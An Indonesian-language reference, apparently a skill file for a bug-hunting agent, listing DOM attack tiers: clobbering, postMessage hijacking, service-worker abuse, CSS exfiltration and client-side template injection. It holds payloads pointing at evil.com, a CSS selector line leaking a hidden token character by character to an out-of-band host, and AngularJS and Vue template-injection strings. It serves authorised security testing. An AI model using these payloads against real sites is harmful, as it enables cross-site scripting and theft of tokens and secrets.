# DOM Attack Battery — clobbering / postMessage / service-worker / CSS exfil / CSTI

Katalog eksekusi cepat untuk `hunt-dom`. SKILL.md sudah 6 phase detail + chain table; di sini
battery berjenjang + kill-signal + fingerprint. Additive-only.

**Prinsip (dari SKILL.md):** semuanya client-side → bukti = DEMO di browser (DOM nyata), bukan
`curl` (yang tak menjalankan JS). OOB sink (Collaborator/interactsh) wajib untuk CSS-exfil & SW.

---

## Tier 0 — DOM Clobbering

Sinyal: app baca element id/name sebagai objek JS, atau feed clobberable global ke sink
(location, innerHTML, eval, script.src). Inject MARKUP (tanpa script) di sink yang lewati id/name.

```
Single-level:       <a id="config" href="https://evil.com">
Nested (window.a.b): <a id="x"></a><a id="x" name="y" href="https://evil.com">
Form/input nesting:  <form id="a"><input id="b" name="c" value="clobbered"></form>
baseURI hijack:      <base href="https://evil.com/">     # bend relative src/href
```

**Kill-signal:** clobbered global mencapai sink → XSS / script.src hijack / open-redirect.
Gunakan **DOM-Invader** (Burp) → auto-find clobberable sources→sinks.

---

## Tier 1 — PostMessage hijacking

1. Cari handler tanpa origin check: `addEventListener("message", ...)` tanpa `.origin` validate.
2. Baca ±20 baris sekitar: kemana `event.data`? (innerHTML/eval/location/patuh):
3. Flag sender leak: `postMessage(<secret>, "*")` (wildcard target).

**Kill-signal:** origin penyerang kirim `event.data` → data/aksi dieksekusi tanpa cek origin → XSS/auth-bypass.

---

## Tier 2 — Service Worker abuse

- Enumerate SW + scope (`navigator.serviceWorker` / `sw.js`).
- Cari upload/route yang return `Content-Type: text/javascript` pada konten KAMU → upload SW payload →
  register dengan scope luas → kontrol semua request di scope (persistent XSS).

**Kill-signal:** SW penyerang ter-register di scope korban → persistent full-compromise.

---

## Tier 3 — CSS injection / exfiltration (d0nut technique)

Prereq: kontrol CSS (custom-theme, style passthrough, email template, markdown CSS).
Target: hidden CSRF input, API key di meta, nonce attr.

```
1. confirm: inject color:red pada elemen dikenal → observe render.
2. leak char-by-char: attribute selector + url() ke OOB.
   input[value^="a"]{background:url(https://oob/?a)}
   input[value^="b"]{...}
3. real exfil = recursion: stylesheet @import tarik posisi berikutnya hanya setelah prefix cocok
   (d0nut) — menghilangkan batas "static input, 1 char".
```

**Kill-signal:** nilai secret (CSRF token/API key) dieksfiltrasi char-by-char ke OOB.

---

## Tier 4 — dangerouslySetInnerHTML / framework sink (React/Next/Vue)

- Trace di minified bundle: user data mencapai dangerouslySetInnerHTML TANPA sanitizer.
- DOMPurify ada → cek clobbering/mXSS bypass (Bentkowski).
- vendor framramework: Vue `v-html`, Angular `[innerHTML]`.

---

## Tier 5 — Client-Side Template Injection (CSTI)

```
detect: {{7*7}} -> 49 di DOM LANGSUNG (bukan raw HTML) = CSTI  (bukan server-side)
AngularJS: {{constructor.constructor('alert(document.domain)')()}}
Vue 2/3: {{_c.constructor('alert(1)')()}}
```

**Kill-signal:** eksekusi JS dari CSTI di browser korban → XSS.

---

## Fingerprint quick-ref

1. DOM-Invader → clobbering + postMessage + sources→sinks.
2. Grep postMessage handler (`addEventListener("message"`) → cek origin check.
3. Grep `dangerouslySetInnerHTML|v-html|innerHTML|eval(` di bundle.
4. Cek SW register + upload Content-Type.
5. CSS injection point → char-by-char exfil.

## Refusal-pattern

- Demo via `curl` = tidak valid (client-side butuh browser).
- CSS injection tanpa exfil (cuma styling) = bukan temuan (butuh leak secret).
- postMessage handler WITH origin check = aman (jangan lapor).
- `{{7*7}}` dirender server-side = bukan CSTI (cek DOM, bukan raw HTML).